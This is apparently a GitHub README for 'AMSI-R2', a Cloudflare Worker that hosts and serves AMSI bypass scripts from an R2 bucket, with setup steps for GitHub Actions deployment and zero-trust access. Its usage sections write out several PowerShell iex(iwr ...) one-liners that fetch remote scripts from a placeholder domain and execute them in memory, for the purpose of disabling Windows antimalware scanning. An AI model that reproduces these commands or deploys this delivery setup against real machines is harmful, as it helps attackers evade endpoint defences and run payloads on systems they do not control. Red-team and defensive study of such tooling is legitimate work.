# AMSI-R2

## Summary

Easy access to your amsi bypass script with Cloudflare workers and R2 bucket

## Description

Cloudflare worker function that selects a AMSI bypass file from a folder in a Cloudflare R2 bucket. The idea came from [Flangvik](https://twitter.com/Flangvik) [AMSI.fail](https://github.com/Flangvik/AMSI.fail).

## Features

- Using Cloudflare Workers and R2 feature (free tier is enough)
- Protect your endpoint behind CF zero-trust (free for 1-50 users)
- Deploy with Github actions

## Things you need

- Cloudflare account (you will need your account id)
- Cloudflare API token. Doc [here](https://developers.cloudflare.com/fundamentals/api/get-started/create-token/)
- Create a R2 bucket
- In your new R2 bucket, create a folder which will contain your AMSI bypass scripts. And obviously... add your scripts in that folder.
- Fork or clone the project
- Setup [Github secrets repository](https://docs.github.com/en/actions/learn-github-actions/variables#creating-configuration-variables-for-a-repository)
- A [domain setup in CF](https://developers.cloudflare.com/fundamentals/get-started/setup/add-site/) to use the [custom domain feature](https://developers.cloudflare.com/workers/configuration/routing/custom-domains/).
- You don't have to do any modifcation in `wrangler.toml` (except if you want to change the name of your worker or if you don't want to use a custom domain). We are using Github secrets to setup the `wrangler.toml` file.

note: to use without custom domain(not recommended), you will need to modify 2 things:

- remove the 3rd sed command in `.github/workflows/deploy.yml`
- remove the route section in `wrangler.toml`

## Installation

```bash
# fork the project
# setup secrets, R2, etc.
git clone https://github.com/<your-user>/AMSI-R2.git
cd AMSI-R2
# ...
git push -u origin main
# go see your workers in cloudflare interface
```

## How to use

```bash
# ex: random
curl "https://subdomain.yourdomain.com/<folder-name>"
iex(iwr -UseBasicParsing -Uri 'https://subdomain.yourdomain.com/<folder-name>');
# specific amsi bypass script
curl "https://subdomain.yourdomain.com/<folder-name>?payload=<the-payload-id>"
iex(iwr -UseBasicParsing -Uri 'https://subdomain.yourdomain.com/<folder-name>?payload=<the-payload-id>');
###
curl "https://amsi-r2.example.com/amsibypass"
iex(iwr -UseBasicParsing -Uri 'https://amsi-r2.example.com/amsibypass');
#
curl "https://amsi-r2.example.com/amsibypass?payload=2"
iex(iwr -UseBasicParsing -Uri 'https://amsi-r2.example.com/amsibypass?payload=2');
```

## How to use with CF zero-trust

- Generate [service auth token](https://developers.cloudflare.com/cloudflare-one/identity/service-tokens/).
- Add worker domain in CF zero-trust [application section](https://developers.cloudflare.com/cloudflare-one/applications/configure-apps/self-hosted-apps/). During the creation, setup a rule that allows your service token.

```bash
# curl command to access behind the zero-trust
curl "https://amsi-r2.example.com/amsibypass" -H "CF-Access-Client-Id: <your-CF-Access-Client-Id>" -H "CF-Access-Client-Secret: <your-CF-Access-Client-Secret>"
iex(iwr -UseBasicParsing -Uri 'https://amsi-r2.example.com/amsibypass' -Headers @{'CF-Access-Client-Id' = '<your-CF-Access-Client-Id>'; 'CF-Access-Client-Secret' = '<your-CF-Access-Client-Secret>'});
#
curl "https://amsi-r2.example.com/amsibypass?payload=2" -H "CF-Access-Client-Id: <your-CF-Access-Client-Id>" -H "CF-Access-Client-Secret: <your-CF-Access-Client-Secret>"
iex(iwr -UseBasicParsing -Uri 'https://amsi-r2.example.com/amsibypass?payload=2' -Headers @{'CF-Access-Client-Id' = '<your-CF-Access-Client-Id>'; 'CF-Access-Client-Secret' = '<your-CF-Access-Client-Secret>'});
```

## Todo

Integrate the logic/obfuscation of [AMSI.fail](https://github.com/Flangvik/AMSI.fail)

## More ?

You want something with a UI ? Take a look at [Some-R2-Explorer](https://github.com/service-yack/Some-R2-Explorer)

## Credits

- [Flangvik](https://twitter.com/Flangvik)
- [somecanadian](https://github.com/som3canadian)
